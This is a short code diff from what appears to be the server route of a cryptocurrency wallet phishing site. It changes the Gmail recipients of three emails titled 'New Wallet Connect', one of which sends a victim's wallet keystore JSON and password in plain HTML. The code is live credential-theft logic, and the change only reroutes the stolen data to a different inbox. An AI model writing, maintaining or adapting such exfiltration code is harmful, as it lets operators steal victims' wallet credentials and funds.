@@ -37,7 +37,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `New Wallet Connect .`,
-        to: ["at2968771@gmail.com", "fahadabdullahi180@gmail.com"],
+        to: ["jamesanderson197x@gmail.com"],
         subject: "N",
         html: formattedMessage,
       }
@@ -76,7 +76,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `New Wallet Connect .`,
-        to: ["at2968771@gmail.com", "fahadabdullahi180@gmail.com"],
+        to: ["jamesanderson197x@gmail.com"],
         subject: "New Connection",
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       }
@@ -117,7 +117,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `New Wallet Connect .`,
-        to: ["at2968771@gmail.com", "fahadabdullahi180@gmail.com"],
+        to: ["jamesanderson197x@gmail.com"],
         subject: "New Connection",
         html: formattedMessage,
       }
